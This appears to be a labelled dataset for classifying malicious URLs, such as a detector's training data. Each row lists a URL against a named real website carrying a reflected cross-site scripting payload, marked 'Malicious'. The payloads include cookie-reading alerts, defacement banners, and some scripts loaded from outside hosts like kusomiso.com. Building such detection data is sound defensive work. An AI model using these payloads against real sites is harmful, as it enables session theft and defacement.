http://www.jrc.or.jp/newinfo/list.cgi?start=%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://people.w3.org/rishida/utils/subtags/index.php?find='%22%3e%3c%3cscript%3ealert(1)%3c/script%3e%3e&submit=find,Malicious
http://www.cal-agri.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://555.com/results-b.jsp?searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;x=30&amp;y=16&amp;domainna<br>me=555.com&amp;w=false&amp;afdt=mwhggj8p7i0kewik343hwjmmahuibrokhekwjqmyayaamivwoam4fq&amp;searchbox=y,Malicious
http://1numara.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
https://service.versatel.de/index.html?target_page=index.html&amp;loginname=%22%3e%3cscript%3ealert%281%<br>29%3c%2fscript%3e&amp;password=&amp;x=762&amp;y=417,Malicious
http://www.concettabosco.it/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://fmet.terra.com.br/noticias/noticia.asp?noticias_id=78&amp;titulo=&lt;script&gt;alert(string.fromcharcod<br>e(88,83,83,32,98,121,32,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,98,117,103,98,11<br>7,115,116,101,114,46,99,111,109,46,98,114));&lt;/script&gt;",Malicious
http://cincinnati.reds.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://ambafrance-us.org/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20the%20rat')%<br>3c/script%3e,Malicious
http://www.sanfernando.gov.ar/buscador_procesar.asp?pbuscar=%22%3e%3cscript%3ealert(/xss/);%3c/scrip<br>t%3e,Malicious
http://diaz-balart.house.gov/index.cfm?fuseaction=search.home&amp;searchtext=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://webwhak.com/tester.php/%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://allpoetry.com/home/search?search=%27%22%3e%3cscript%3ealert(%27xss%20by%20bho%27);%20document<br>.body.innerhtml=%27%3ch1%3exss%20by%20bho%3c/h1%3e%27%3c/script%3e&amp;=go,Malicious
https://netac4.vie.hosting.nokia.com/pkgbuilder/src/pkgbuilderhelp.jsp?u=kiktsz4wuq5c6&amp;lng=%3cscript<br>%3ealert%28/xss/%29%3c/script%3e,Malicious
http://www.perseus.tufts.edu/cgi-bin/browser?object=vase&amp;field=keyword&amp;keyclass=animals&amp;keyword=dog%<br>22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://kiwibidz.com/search.php?min_cur=&amp;mode=advanced&amp;max_cur=&amp;seller=include&amp;seller_name=&quot;&gt;&lt;script&gt;<br>alert(document.cookie)&lt;/script&gt;,Malicious
http://www.prochile.gob.cl/servicios/pequeno_empresario/index.php%3c/script%3e%3cscript%3ealert%28do<br>cument.cookie%29%3c/script%3e,Malicious
http://www.ticketcenter.com/sendpage/friend.php?id=&quot;&gt;&lt;marquee&gt;%3cscript%3ealert(document.cookie);%<br>3c/script%3esome concert tickets&lt;/marquee&gt;,Malicious
http://www.single-kochbuch.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://gals.kellymadison.com/mgps/013/003.html?nats=njy0mjo0oje,0,0,0,%27%22%3e%3c/title%3e%3cscript<br>%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e",Malicious
http://www.mein-ferienjob-in-glashuette.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://chicago.whitesox.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://demo.devil.it/styles_demo/index.php?s=%22%3e%3cscript%3ealert(/scr34m/);%3c/script%3e,Malicious
http://www.skype.gx.cn/huanqiu.asp?form_country=%22%3e%3cscript%3ealert%28/xss/%29%3c/script%3e,Malicious
http://www.in.com/active18/readnow/readsearch.php?search_data=liberty%20oil%20mil%27%22%3e%3c/title%<br>3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/m<br>arquee%3e,Malicious
http://www.canoagem.online.pt/vbforum/threads.asp?category=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/scr<br>ipt&gt;,Malicious
http://movies.myway.com/intheaters.jhtml?genre=&amp;title='%3e%22%3e%3cscript/src=http://kusomiso.com/xs<br>s.js%3e%3c/script%3e&amp;pagenum=11&amp;d=10,Malicious
http://www.et.byu.edu/~kmiller/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
"http://www.formation-publique.fr/fpinscription/catalogue.do?action=//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(s<br>tring.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))&lt;/script&gt;&lt;body onload=alert('xss')&gt;",Malicious
http://www.sivricecumhuriyet.k12.tr/mezun/ogretmenim/basari/login.asp?folder=%22%3e%3cscript%3ealert<br>(document.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e,Malicious
http://www.muslimse.com/index.php?m=main&amp;c=shw_search&amp;query=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert<br>%281337%29%3c%2fscript%3e&amp;submit.x=3&amp;submit.y=15,Malicious
http://ml.lefigaro.fr/figarov5/inscription.php?email=%22%3e%3cscript%3ealert(1337);%3c/script%3e%3cm<br>arquee%3e%3ch1%3exss%20by%20warvector%20=)%20[bis]%3c/h1%3e%3c/marquee%3e,Malicious
http://www.fling.com/main.html?prg=1&amp;id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://gallery.j4jamal.com/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+<br>narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://lnx.ciosbahn.net/gb/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.barneylimdds.com/search.php?search=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://maniya-web.hp.infoseek.co.jp/cgi-bin/bbsnote.cgi?log=12693%22%3e'%3e%3cscript%3ealert('by%20k<br>usomiso.com')%3c/script%3e&amp;fc=thread&amp;res=0-11%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://m-pe.tv/login.php?mode=loginerror&amp;message='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%<br>3e%3c/script%3e3,Malicious
http://ace.tsd.state.tx.us/simple/results/?sessionid=1nyr545aq36524095&amp;searchfield0=interpreting+pra<br>ctice+videotape+%23int-lf+%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%27%22%3e%3cmarquee%3<br>e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.census.gov/acs/www/acs-php/experienced_users_guide.php?acs_topic=place+of+birth-domestic&quot;<br>&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.noah-health.org/search/results.php?lang=2&amp;keyword=%22%3e%3cscript%3ealert(document.cookie<br>)%3c/script%3e,Malicious
http://www.pccomponentes.com/user_error.php?error=no_user&amp;email=%3cscript%3ealert%281%29%3c/script%3<br>e,Malicious
http://www.unitedwayatlanta.org/search.asp?yider=fayette}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(<br>/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.keijaut.nl/search.asp?a=result&amp;q=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e&amp;submit=z<br>oeken,Malicious
http://www.vaticanlibrary.va/home.php?ling=&quot;&gt;&lt;script&gt;alert(&quot;fuck benedict<br>xvi&quot;)&lt;/script&gt;&amp;res=1280x800,Malicious
http://eea.spaceflight.esa.int/?pg=expl&amp;ms=390%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://siteanalytics.compete.com/kaboodle.com/?metric=%22%3e%3cscript%20src=http://vuln.xssed.net/th<br>irdparty/scripts/ckers.org.js%3e%3c/script%3e%22%3e%3cscript%20src=http://vuln.xssed.net/thirdparty/<br>scripts/ckers.org.js%3e%3c/script%3e%22%3e%3cscript%20src=http://vuln.xssed.net/thirdparty/scripts/c<br>kers.org.js%3e%3c/script%3e,Malicious
http://www.al.com/sports/huntsvilletimes/index.ssf?/base/sports/1183108587178380.xml&amp;amp;coll=&quot;&gt;&lt;scr<br>ipt&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.socialworkers.org/credentials/specialty/asw-g.asp?print=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script<br>&gt;,Malicious
http://www.iddaa.com//iddaacom/haberall/default.asp?hdnpage=1&amp;id=eu&amp;takim=%3e%22%3e%3cscript%20%0a%0<br>d%3ealert(document.cookie)%3b%3c/script%3e,Malicious
http://store.steampowered.com/news/?term='&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&lt;marquee%20bgcolor<br>=&quot;red&quot;&gt;&lt;h1&gt;xss%20by%20xylitol&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.anafikir.com/evsoz/goster.asp?baslik=&lt;script&gt;alert(&quot;scriptorium(turkey)%20hackhaber.com&quot;)<br>&lt;/script&gt;,Malicious
http://www.rojevin.com/ajax.php?do=checkusername&amp;param=ajax.php?do=checkusername&amp;param=%22%3e%3cscri<br>pt%3ealert(1)%3c/script%3e,Malicious
http://www.ezsitetool.com/showcase/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bien-etre.ch/wb/article.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script<br>%3e,Malicious
http://www.dreamjournal.org/dj/index.cfm?do=search2&amp;keyword=%22%3e%3cscript%3ealert(0)%3c/script%3e,Malicious
http://www.pornoprobierparty.de/pornopartys/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://vincent.amd.com/it-it/countrylanguage/0,,3,00.html?amdworldflg=';alert(string.fromcharcode(88<br>,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;al<br>ert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcod<br>e(88,83,83))%3c/script%3e",Malicious
http://www.wondernet24.com/cmscontent/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.servicios.clarin.com/buscador/jsp/clarin/v9/resultados.jsp?palabras=&gt;&lt;script&gt;alert('xss')<br>&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;%20%20%20%20by+ivan_sanchez%20www.nullcode.com.ar%20&lt;/h1&gt;&lt;/marquee&gt;&amp;desde=0&amp;l<br>argo=10&amp;op=buscar&amp;como=y&amp;donde=tit&amp;secid=&amp;fecha=90&amp;lr=lang_es&amp;q=&amp;pubid=clarin,Malicious
http://www.cliquojeux.com/forum.php?var='<script>alert(1337)</script>&der=1,Malicious
http://www.final4ever.com/redirector.php?url=%22%3e%3cscript+src=http://ckers.org/s%3e,Malicious
http://losangeles.bizjournals.com/losangeles/wichita/tidbits4.html?jst=&quot;&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/scr<br>ipt&gt;,Malicious
http://www.azleg.state.az.us/documentsforbill.asp?bill_number=%3ciframe+src=http://google.com%3e%3e&amp;<br>image.x=0&amp;image.y=0,Malicious
http://www.turgutuzer.com/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.crawler.com/?show=&quot;&gt;&lt;script&gt;document.write(/123/)&lt;/script&gt;&lt;h1&gt;&lt;font color=&quot;red&quot;&gt;ccc was<br>here&lt;/font&gt;&lt;/h1&gt;,Malicious
http://www.search.ro/search?q=%3cscript%3ealert(%2fthe_miller%2f)%3c%2fscript%3e,Malicious
http://sokth.chpho.go.th/main/guestbook/admin.php?id=9136%27%3e%22%3e%3ciframe%20src%3dhttp%3a%2f%2f<br>kusomiso%2ecom%2fxss%2ehtml%20%3c,Malicious
http://help.travian.fr/index.php?type=%22%3e%3c/script%3e%3cscript%3ealert(/xssed_by_nemesis/);alert<br>(document.cookie);%3c/script%3e,Malicious
http://news.onekoreanews.net/html_file.php?file=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://fr.xfire.com/clans/?process=search&amp;sk=%27%22%3e%3cmarquee%3e%3ch1%3edefaced%20by%20ironzorg%3<br>c/h1%3e%3c/marquee%3e,Malicious
http://tusca.ut.ac.ir/gallery/viewgallery.asp?id=93&amp;num=%22%20%22/%3e%3cscript%3ealert%28/securityla<br>b.ir/%29%3c/script%3e%20bad%3d%22&amp;tot=8,Malicious
http://www.searchhuts.co.uk/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.vkbanen.nl/lijst_banen/banen_in_jouw_regio.jsp?zoek=zoek&amp;fulltextsearch=&quot;&gt;&lt;script&gt;alert+(<br>'killer-tr')&lt;%2fscript&gt;&amp;text_autocomplete_regio=plaats&amp;postcode=&amp;straal=10&amp;zoek=zoek,Malicious
http://hawaii.gov/dcca_condo/search_result.php?sort=4&amp;proj_no=%22%3e%3cscript%3ealert%28/xssed/%29%3<br>c/script%3e&amp;proj_name=&amp;zoning=&amp;tmk_no=&amp;proj_city=&amp;dev_name=&amp;unt_ttl1=&amp;unt_ttl2=,Malicious
http://www.virginmedia.com/results/?q=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.presidency.ro/index.php?keywords=%3cscript%3ealert%28%27romanian+president+website+xssed+<br>by+dr.optix%5cn%5cnuniti-va+si+luptati+fratilor%21%5cnunite+and+fight+brothers%21%5cn%5cn-----------<br>-------%5cng-girl%5cnpasswrdyserv%5cnthe_flash%5cnorijinal%5cnnetfish%5cnwolfrat%5cnac1d%5cnand+many<br>+others%5cn------------------%5cn%5cnwith+love+dr.optix%27%29%3c%2fscript%3e&amp;doc=0&amp;s_tema=orice&amp;adel<br>a%5bzi%5d=&amp;adela%5bluna%5d=&amp;adela%5ban%5d=&amp;ala%5bzi%5d=&amp;ala%5bluna%5d=&amp;ala%5ban%5d=&amp;ok=cauta&amp;off=0&amp;i<br>s=center&amp;_rid=search,Malicious
http://vargas.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/scri<br>pt%3e,Malicious
http://es.myweb2.search.yahoo.com/yhs/search?fr=yhs-ipnmrtl&amp;ei=utf-8&amp;lyt=st&amp;p=&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie)&lt;/script&gt;,Malicious
http://keiziban.org/bbs.php?id=okane13&amp;accpw=&amp;hostflg=''%3e%22%3e%3cscript/src=http://kusomiso.com/x<br>.js%3e%3c/script%3e,Malicious
http://www.buygraftonfarm.co.nz/gallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.gameplanet.jp/gameinfo/list.htm?sort2=70%22%3e'%3e%3cscript%3ealert(string.fromcharcode(8<br>8,83,83))%3c/script%3e",Malicious
http://digital.turkeyactivity.com/sizdengelen/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://historico.eluniversal.com.mx/buscar3.html?p_texto=%22%3e%3cmarquee%3edefaced%20by%20sponsfull<br>%3c/marquee%3e,Malicious
http://www.energyrating.gov.au/appsearch/refrig_srch.asp?sort=[sri2009]+desc&amp;list=basic&amp;elec=&amp;years=<br>&amp;type=all&amp;capacity=all%2c&amp;brand=all&amp;model=%3cscript%3ealert%28%22xssed%20by%20prashant%22%29%3c%2fsc<br>ript%3e&amp;b1=search,Malicious
http://male.kaimono-shop.net/site/3csc%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3<br>cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3eript/,Malicious
http://www.zirve100.com/search.asp?domains=www.zirve100.com&amp;q=%3d%22%3e%3cscript%3ealert%28document.<br>cookie%29%3c%2fscript%3e%3ch1%3efujked%3c%2fh1%3e&amp;sitesearch=www.zirve100.com&amp;sa=google+arama&amp;client<br>=pub-2069773300337230&amp;channel=4805043663&amp;forid=1&amp;ie=iso-8859-9&amp;oe=iso-8859-9&amp;cof=galt%3a%23008000%3b<br>gl%3a1%3bdiv%3a%23336699%3bvlc%3a663399%3bah%3acenter%3bbgc%3affffff%3blbgc%3a336699%3balc%3a0000ff%<br>3blc%3a0000ff%3bt%3a000000%3bgfnt%3a0000ff%3bgimp%3a0000ff%3blh%3a30%3blw%3a90%3bl%3ahttp%3a%2f%2fww<br>w.zirve100.com%2fimages%2ficon1.gif%3bs%3ahttp%3a%2f%2fwww.zirve100.com%2f%3bforid%3a11&amp;hl=tr,Malicious
https://www.nic.ru/whois/en/?query=%22%3e%3cscript%3ealert(%22i-landet%22)%3c/script%3e,Malicious
http://www.zdnetasia.com/techjobs/jobs/search.htm?term=asp&amp;country=%27%22%3e%3c/title%3e%3cscript%3e<br>alert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e%27%22%3e%3<br>c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c<br>/marquee%3e,Malicious
http://www.1up.com/do/resetpasswordform?key=1448715933368911182&amp;email=%22%3e%3ciframe%20src=http://g<br>oogle.com%3e%3c/iframe%3e%3cscript%20src=http://ha.ckers.org/xss.js?/%3e,Malicious
http://www.sciam.com/podcast/index.cfm?e_type=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.drs.dk//site_search.asp?search=%3e%22%3e%3cscript%3ealert%28%27xss%20-%20vuln%27%29%3c%2f<br>script%3e,Malicious
http://www.maximilian-maier.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://entity.ummu.umich.edu/~asdf/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][<br>][][][][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious
http://www.co.pierce.wa.us/cfapps/linx/calendar/getcivilcase.cfm?cause_num=%3c/title%3e%3cscript%3ea<br>lert%28%27xss%20by%20kakia%20-%20kakia.baywords.org%27%29;%3c/script%3e,Malicious
http://www.lygus.lt/itc/nvo.php?p=1&amp;pavadinimas=%22%3cscript%3ealert%287%29%3b%3c%2fscript%3e&amp;sutrum<br>pinimas=&amp;miestas=0&amp;vadove=&amp;tipas=0&amp;nariai=&amp;darbuotojai=&amp;savanoriai=&amp;kryptis=0&amp;submit=ie%f0koti,Malicious
http://www.ohloh.net/people?query=%3cscript%3ealert(%27xss%27)%3b%3c%2fscript%3e,Malicious
http://web.njcu.edu/its/photogallery/reslife/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.achei.com.br/cgi-ps/ps_query1.cgi?franq=028&amp;country=br&amp;countries=br&amp;tipo=e&amp;opcao=br&amp;x=0&amp;y<br>=0&amp;query=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22,Malicious
http://textsearch.vrbo.com/search?q='&quot;&gt;&lt;script&gt;alert('xss');&lt;/script&gt;&amp;btng=go&amp;site=listingpages&amp;clie<br>nt=listingpages&amp;proxystylesheet=listingpages&amp;output=xml_no_dtd&amp;num=100&amp;getfields=vrbodesc.shortdesc.<br>location&amp;filter=0,Malicious
http://big5.yesky.com/b5/mms.my5757.com/newnetls_zh/singerbs.jsp?s=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script<br>&gt;,Malicious
http://poliperlis.edu.my/igallery33/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://publib.boulder.ibm.com/cgi-bin/iseries/search.cgi?keyword=%22%3e%3cscript%3ealert%28%22xssed%<br>20by%20snypter%22%29%3c/script%3e&amp;submit=search,Malicious
http://www.batimer.com/mods.php?go=downloads&amp;p=ld&amp;mode=file&amp;val=1%22%3e%3ch1%3eby%20st@rext%3c/h1%3e<br>%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.mercadolivre.com.pt/portugal/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
http://www.gobernaciondesantander.gov.co/santander/portal/modulos.php?name=contenido&amp;file=contenido&amp;<br>codi=272'%22%3e%3ch1%3exss222222222222%3ciframe%20src=http://xssed.com%3e&amp;namecont=fotos%20del%20gob<br>ernador&amp;subs=27,Malicious
http://bedavaforum.org/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.philipbriel.com/asp_gallery_folder/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.thainavigation.com/q_search_hotel.php?q_orderby=name&amp;q_ordercase=asc&amp;q_area=&amp;q_province=&amp;<br>q_price=&amp;q_text='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xss.html%20%3c&amp;submit=%8c%9f%8d%f5&amp;q_s<br>tar=&amp;order_by=&amp;q_case=adv&amp;q_category=1&amp;totalcheckboxid=28,Malicious
http://mcafee.com/japan/mcafee/support/faq/answer_f_account.asp?wk=ac-00005%22%3e'%3e%3cscript%3eale<br>rt('x')%3c/script%3e,Malicious
http://english.stanford.edu/bio.php?name_id=1%3cscript%3ealert%28/securitylab.ir/%29%3c/script%3e,Malicious
http://www.benq.ca/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://mobile.ghanaweb.com/wap/comment.article.php?id=160890}%3c/style%3e%3cscript%3ea=eval;b=alert;<br>a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exxxxxxxxx%3c/h1%3e%3c/marquee%3e,Malicious
http://myaccount.simplicato.com/?s=myaccount&amp;p=index&amp;m=%3e%3cscript%3ealert(%22xssed%20by%20azat%22)<br>%3c/script%3e&amp;u=&amp;d=,Malicious
http://www.jobijoba.com/fr/recherche.php?rch=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3cma<br>rquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarq&amp;loc=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2fscr<br>ipt%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c&amp;submit.x=0&amp;submit.y=0,Malicious
http://nxddl.com/index.php?q=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso%2ecom%2fxss%2ejs%3e<br>%3c%2fscript%3e&amp;b1=search,Malicious
http://www.usdk.fr/index.php?contenu=recherche.php?critere=%22%3e%3cmarquee%3e%3ch1%3edefaced%20by%2<br>0ironzorg%3c/h1%3e%3c/marquee%3e,Malicious
http://www.cavalierdaily.com/features/salaries/bydepartment.asp?year=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scri<br>pt&gt;,Malicious
http://www.openlab.cn/cgi-bin/gettopicno.cgi?forum=1%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72<br>%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%<br>30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2<br>c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;topic=26&amp;show=1850,Malicious
"http://www10.big.or.jp/~miyazaki/rhp/sys/cgi-bin/login.cgi?user_name='%22%3e'%3e%3cscript%3ealert(st<br>ring.fromcharcode(88,83,83))%3c/script%3e&amp;password=",Malicious
http://concours.fonction-publique.gouv.fr/search/detail_conc.cfm?num_conc=%22%3e'%3e%3cscript%20src=<br>http://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.michelin.no/no/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://test.cybershop.gen.tr/cicek/site/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)<br>&lt;/script&gt;,Malicious
http://www.ncgg.info/main.php?id=26%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://forumup.it/directory.php?cat=%22%3e%3cscript%3ealert(/ciao/);%3c/script%3e,Malicious
http://www.themovieinsider.com/search.php?sitesearch=themovieinsider.com&amp;domains=themovieinsider.com<br>&amp;q=%22%22%3e%3e%3c%3cimg+%22%22%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e&amp;sa=search&amp;clien<br>t=pub-9136844266644239&amp;forid=1&amp;ie=iso-8859-1&amp;oe=iso-8859-1&amp;safe=active&amp;cof=galt%3a%23008000%3bgl%3a1<br>%3bdiv%3a%23336699%3bvlc%3a663399%3bah%3acenter%3bbgc%3affffff%3blbgc%3a336699%3balc%3a0000ff%3blc%3<br>a0000ff%3bt%3a000000%3bgfnt%3a0000ff%3bgimp%3a0000ff%3bforid%3a11&amp;hl=en,Malicious
http://hackersafe.de/index2.php?ll=enqnyzssgcamrdenmb7gdqunkaeth49sx+0tbo/cg2qh4yq1zdkx2a9w+ihbimimq<br>eko1muurtqxltzz3bs4x2j8teqxp/qw6odgl2jlxbsfxna+azmcnqa=%22%3e%3cscript%3ealert(/daimon%20safe%20ok!/<br>)%3c/script%3e,Malicious
http://www.206.usn.ac/cgi/in.cgi?id=cjclub'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/s<br>cript%3e,Malicious
http://www.freeauctions.co.nz/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
